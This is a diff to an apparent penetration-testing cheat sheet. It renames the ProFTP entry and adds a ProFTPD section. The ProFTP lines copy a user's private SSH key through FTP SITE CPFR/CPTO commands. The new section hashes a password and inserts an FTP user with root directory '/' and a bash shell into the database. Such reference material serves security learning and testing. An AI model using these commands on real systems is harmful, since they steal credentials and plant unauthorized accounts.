@@ -74,7 +74,8 @@
 - [PowerShell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#PowerShell-1)
 - [printf](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#printf)
 - [proc](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#proc)
-- [proftp](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#proftp)
+- [ProFTP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ProFTP)
+- [ProFTPD](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#ProFTPD)
 - [Python2](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Python2)
 - [Python](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Python)
 - [Python TOTP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Python-TOTP)
@@ -4363,11 +4364,23 @@ $ ls -l /proc/self/cwd
 $ cat /proc/self/fd/10
 ```
 
-## proftp
+## ProFTP
 
 ```c
 $ SITE CPFR /home/<USERNAME>/.ssh/id_rsa
 $ SITE CPTO /var/tmp/id_rsa
+```
+
+## ProFTPD
+
+### Add User to Database
+
+```c
+$ echo {md5}`echo -n <PASSWORD> | openssl dgst -binary -md5 | openssl enc -base64`
+```
+
+```c
+mysql> INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('2', '<USERNAME>', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
 ```
 
 ## Python2
